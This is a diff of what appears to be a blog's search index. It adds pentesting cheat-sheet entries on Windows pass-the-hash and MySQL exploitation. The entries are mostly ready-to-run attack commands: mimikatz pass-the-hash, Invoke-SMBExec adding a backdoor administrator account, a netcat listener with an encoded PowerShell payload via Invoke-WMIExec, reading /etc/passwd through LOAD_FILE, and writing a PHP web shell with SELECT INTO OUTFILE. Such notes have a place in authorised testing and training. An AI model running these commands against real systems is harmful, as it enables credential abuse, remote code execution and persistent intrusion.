-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows Credential Hunting</title>
     <url>/2025/11/26/Windows-Credential-Hunting/</url>
     <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
@@ -738,6 +712,75 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
